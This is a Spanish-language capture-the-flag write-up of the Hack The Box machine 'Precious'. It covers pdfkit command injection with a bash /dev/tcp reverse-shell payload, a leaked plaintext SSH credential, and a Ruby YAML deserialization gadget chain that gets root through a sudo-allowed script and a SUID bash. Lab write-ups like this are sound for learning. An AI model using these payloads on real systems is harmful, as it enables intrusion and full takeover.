# PreciousWriteup

Comenzamos haciendo un escaneo en nmap

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/9adab530-5f29-48e7-94f7-9963cef27d85)

Vemos abierto dos puertos el 22 y el 80

~~~
sudo nmap -v -sS -oX vulnerabilidades.xml --stylesheet="https://svn.nmap.org/nmap/docs/nmap.xsl" --script=vuln 10.10.11.189
~~~

Entramos a la página web y vemos que no carga agregamos a /etc/hosts la ip seguida de precious.htb

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/70856aa6-e7a3-4c48-bebc-3184521d9968)

Vemos esta página, creamos un server con python -m http.server 80

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/862b14e8-2632-4fa8-a47f-368fb100ce17)

Ponemos nuestro link para que genere el pdf

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/cfc0aa43-a424-48c4-b474-3a95bc1d5887)

Vemos los metadatos y dice generated by pdfkit v0.8.6

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/29a00b1f-4530-4d40-be18-6e1c45d0f54d)

Buscamos vulnerabilidades para pdfkit

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/5d80fa24-515e-44d6-b8ba-cbc0852da1ef)

Vemos que permite la ejecucion remota de comandos

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/b6bdc2d2-c40c-4b25-952d-589c5c9ac2ac)

Lo calamos

~~~
http://example.com/?name=#{'%20`sleep 5`'}
~~~

Vemos que si tarda 5 segs en conectar

Calamos generar un reverse shell

~~~
http://10.10.14.136/?name=#{'%20`bash -c "/bin/bash -i >& /dev/tcp/10.10.14.136/9123 0>&1"`'}
~~~

Damos el -c para que se ejecute bien 

~~~
-c        If the -c option is present, then commands are read from the first non-option argument command_string.  If there are arguments after the command_string, the first argument is assigned to $0 and any remaining argu‐
                 ments are assigned to the positional parameters.  The assignment to $0 sets the name of the shell, which is used in warning and error messages.
       -i        If the -i option is present, the shell is interactive.
~~~

Estamos en /var/www/pdfapp, vamos a home

Damos un ls y no hay nada, damos ls -laRh, para ver carpetas y subcarpetas ocultas

Vemos varias

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/669cab4b-e1c4-4fda-a248-75348fb35730)

Entramos a ./.bundle

Vemos config y hay como una clave de ssh

~~~
henry:Q3c1AqGHtoI0aXAYFH
~~~

Entramos y ganamos la primera flag

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/b416ec1f-1154-4985-8a21-62ae9f996e31)

Ahora damos sudo -l para ver variables de entorno

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/b415c905-df00-4ac4-8d67-d017b48bc32a)

~~~
-l, --list  If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.  A longer list format is used if this option is specified
                 multiple times and the security policy supports a verbose output format.

                 If a command is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments.  If a command is specified but not allowed by the pol‐
                 icy, sudo will exit with a status value of 1
~~~

Nos vamos a opt

A ver el update_dependencies.rb

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/87383423-d1ee-44aa-bc9b-51677e66b26e)

Vemos que abre un archivo dependencies.yml y no especifica el camino

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/96e9610e-9cef-4451-9855-7516374e4603)

Y vemos que tiene permisos de root

Enocntramos que se puede deserializar, con ruby 


~~~
---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve 
~~~

En git set podemos ejecutar el comando

Ponemos chmod +s /bin/bash

Y hacemos bash -p

![imagen](https://github.com/Hamibubu/PreciousWriteup/assets/108554878/c6d48436-17eb-4fe7-bcfe-6c813d2da2a5)

Y obtenemos la flag



